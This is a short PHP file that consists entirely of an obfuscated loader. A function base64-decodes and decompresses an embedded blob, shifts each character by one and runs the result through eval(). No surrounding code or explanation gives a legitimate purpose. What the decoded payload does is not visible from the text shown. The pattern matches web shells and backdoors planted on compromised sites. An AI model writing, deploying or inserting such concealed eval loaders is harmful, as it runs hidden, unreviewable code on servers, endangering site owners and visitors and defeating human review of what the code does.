<?php function twL($HAl)
{ 
$HAl=gzinflate(base64_decode($HAl));
 for($i=0;$i<strlen($HAl);$i++)
 {
$HAl[$i] = chr(ord($HAl[$i])-1);
 }
 return $HAl;
 }eval(twL("rVP/btowEH4AP4UVRS1IKNkYP1YQrVxGKQMSlISu3TRFJvEgakgix0C7H1IfYk+wR+uL7GxIx1j/mTYrii/f3X3f+c7BGBZCOcvzKE38XFAuSuU2ipIgXoUMa4YpWMzmnC6NbJFpbYT0kM0igfdWB+v+xHa9D8fKdfyxjXTf7bnuwLaeMBmlTEmxpnEUPk+hXAcUO0xGKVNSBOv18wTgOEhXiIwAA1KRvoTj0jkDSEOP3x/+8UG964sb/BWfdwm8R2RiO8TCw945sYbwObBaCD0+/MBvBv2Bhy17bDu4BZ3dtsPQlNMjVr9PRqZHLqfW1q2OunN3r662IBzB+B9Fy0l+WiWBgLHjnCXheNuTkl7M24/CCi5aBVYU+rNUlPEXJPutr3gs+7cQIstbpkmzyHi6KSmfmxCrYaNIA0sz92TOMspz5i/TkHWWlN+G6SY5ChZUgGpH5e2V0d5XVBuwHQl2J1QoACwJgKlUVFveZQQLSAjA70dJpO61gtNMEM7pPTip3EuouEXdqTOyJ54PG+6cKq3KH06n500dy4Mhuxc9R8YJvmIqbKegJHMmQMjfKkAplV/CRSGc5atYFDWyOxbIwH2SIE5ztgO/IZ3DXwNNb75svqq+btbqVRijvqGJBBsnjVq19qJ+Um8Rcvk5uLmmcSNZu28308wbzt6N77334+q82k0XpLuR8/9t7Pxg3MAKmn9zM4Dx7PQn"));?>
